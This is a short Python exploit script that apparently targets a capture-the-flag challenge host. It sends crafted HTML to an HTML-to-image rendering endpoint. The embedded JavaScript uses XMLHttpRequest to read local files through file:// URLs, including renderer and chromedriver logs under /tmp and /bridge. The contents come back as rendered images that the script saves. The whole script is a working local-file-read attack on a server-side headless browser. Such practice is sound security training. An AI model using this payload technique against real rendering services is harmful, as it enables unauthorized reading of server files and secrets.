import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE+'/html-to-image', json={'pages':[html]}, timeout=60)
            if r.status_code==200 and 'zip' in r.headers.get('Content-Type',''):
                z=zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    open(f'f:/mission-git-hackss/mission-git-hackss/lg_{name}.jpg','wb').write(z.read(n))
                    print(f'{name}: {len(z.read(n))} OK')
                return
            print(f'{name}: [{r.status_code}] {r.text[:120]}'); return
        except Exception: time.sleep(2)

def xhr(path):
    return f'<!doctype html><html><body style="font:12px monospace;white-space:pre-wrap;word-break:break-all"><div id=o>x</div><script>var x=new XMLHttpRequest();try{{x.open("GET","file://{path}",false);x.send();document.getElementById("o").textContent=x.responseText||("E:"+x.status);}}catch(e){{document.getElementById("o").textContent="ERR:"+e;}}</script></body></html>'

for path,name in [
    ('/tmp/deckforge-render-chromedriver.log','renderlog'),
    ('/tmp/renderer.stdout.log','rendstdout'),
    ('/tmp/renderer.stderr.log','rendstderr'),
    ('/bridge/render-chromedriver.log','bridgelog'),
    ('/bridge/chromedriver.log','bridgecdlog'),
]:
    render(xhr(path), name); time.sleep(1)
